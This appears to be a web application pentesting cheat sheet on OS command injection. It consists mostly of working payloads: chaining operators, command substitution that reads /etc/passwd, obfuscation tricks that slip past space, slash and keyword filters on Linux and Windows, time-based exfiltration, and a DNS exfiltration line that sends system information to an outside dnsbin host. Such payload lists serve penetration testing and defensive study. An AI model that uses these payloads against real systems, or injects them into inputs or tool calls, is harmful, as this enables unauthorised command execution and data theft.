---
menu: Command Injection
title: Command Injection - Web Applications Pentesting
---

# Command Injection

## At a Glance

Command injection is an attack
in which the attacker
executes arbitrary commands
on the host OS
via a vulnerable application.
Command injection attacks are possible
when an application
passes unsafe user-supplied data
to a system shell.
[^command-injection-owasp]

{{<note>}}
Commands are usually executed with the privileges of the vulnerable application.
{{</note>}}

## Command Chaining

```sh
<input>; ls
<input>& ls
<input>&& ls
<input>| ls
<input>|| ls
```

{{<note>}}
Also try:
- Prepending a flag or parameter.
- Removing spaces (`<input>;ls`).
{{</note>}}

### Chaining Operators

Windows and Unix supported.

|      | Syntax          | Description                                           |
| ---- | -------------   | -------                                               |
| `%0A`| `cmd1 %0A cmd2` | Newline. Executes both.                               |
| `;`  | `cmd1 ; cmd2`   | Semi-colon operator. Executes both.                   |
| `&`  | `cmd1 & cmd2`   | Runs command in the background. Executes both.        |
| `|`  | `cmd1 | cmd2`   | PIPE operator. Sends `cmd1`'s output as `cmd2` input. |
| `&&` | `cmd1 && cmd2`  | AND operator. Executes `cmd2` if `cmd1` succeds.      |
| `||` | `cmd1 || cmd2`  | OR operator. Executes `cmd2` if `cmd1` fails.         |

## I/O Redirection

```sh
> /var/www/html/output.txt
< /etc/passwd
```

## Command Substitution

Replace a command output with the command itself.[^substitution-gnu]

```sh
<input> `cat /etc/passwd`
```

```sh
<input> $(cat /etc/passwd)
```

## Filter Bypassing

### Space filtering [^spaceless-ifs]

#### Linux

```sh
cat</etc/passwd
# bash
${cat,/etc/passwd}
cat${IFS}/etc/passwd
v=$'cat\x20/etc/passwd'&&$v
IFS=,;`cat<<<cat,/etc/passwd`
```

#### Windows [^spaceless-windows-rce]

```ps
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### Slash (`/`) filtering

```sh
echo ${HOME:0:1} # /
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

```sh
echo . | tr '!-0' '"-1' # /
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Command filtering

Quotes.

```sh
w'h'o'am'i
w"h"o"am"i
```

Slash.

```sh
w\ho\am\i
/\b\i\n/////s\h
```

At symbol.

```sh
who$@ami
```

Variable expansion.

```sh
v=/e00tc/pa00sswd
cat ${v//00/}
```

Wildcards.

```ps
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## Time Based Data Exfiltration [^time-based-rce]

```sh
time if [ $(uname -a | cut -c1) == L ]; then sleep 5; fi
```

## DNS Based Data Exfiltration [^dns-bin]

- [pingb.in](//pingb.in)
- [dnsbin.zhack.ca](//dnsbin.zhack.ca)

`dnsbin` Example:

```sh
host $(uname -a).c2cebb6a3678849a2eee.d.zhack.ca
```


[^command-injection-owasp]: “Command Injection | OWASP.” OWASP Foundation | Open Source Foundation for Application Security, https://owasp.org/www-community/attacks/Command_Injection.
[^substitution-gnu]: “Command Injection | OWASP.” OWASP Foundation | Open Source Foundation for Application Security, https://owasp.org/www-community/attacks/Command_Injection.
[^spaceless-windows-rce]: https://twitter.com/bugbountynights/status/860102244171227136
[^spaceless-ifs]: https://twitter.com/asdizzle_/status/895244943526170628
[^time-based-rce]: Pobereznicenco, Dan. “Exploiting Timed Based RCE – Security Café.” Security Café, 28 Feb. 2017, https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/.
[^dns-bin]: ettic-team. “GitHub - Ettic-Team/Dnsbin: The Request.Bin of DNS Request.” GitHub, https://github.com/ettic-team/dnsbin.
